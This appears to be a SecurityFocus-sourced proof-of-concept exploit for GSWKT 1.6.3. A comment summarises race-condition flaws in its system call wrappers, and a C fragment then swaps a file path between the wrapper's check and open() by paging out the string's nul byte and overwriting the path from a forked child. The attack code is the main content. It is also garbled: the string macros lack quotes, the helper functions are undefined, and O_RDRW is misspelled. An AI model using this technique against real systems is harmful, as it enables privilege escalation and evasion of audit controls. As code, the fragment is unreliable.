/*
source: http://www.securityfocus.com/bid/25251/info

GSWKT (Generic Software Wrappers Toolkit) is prone to multiple concurrency vulnerabilities because of its implementation of system call wrappers. This problem can result in a race condition between a user thread and the kernel.

Attackers can exploit these issues by replacing certain values in system call wrappers with malicious data to elevate privileges or to bypass auditing. Successful attacks can completely compromise affected computers.

GSWKT 1.6.3 is vulnerable; other versions may also be affected. 
*/

#define EVIL_NAME ./home/ko/.forward.
#define REAL_NAME ./home/ko/Inbox.
volatile char *path;
/* Set up path string so nul is on different page. */
path = fork_malloc_lastbyte(sizeof(EVIL_NAME));
strcpy(path, EVIL_NAME);
/* Page out the nul so reading it causes a fault. */
pageout_lastbyte(path, sizeof(EVIL_NAME));
/* Create a child to overwrite path on next fault. */
pid = fork_and_overwrite_up(path, REAL_NAME,
sizeof(REAL_NAME));
fd = open(path, O_RDRW);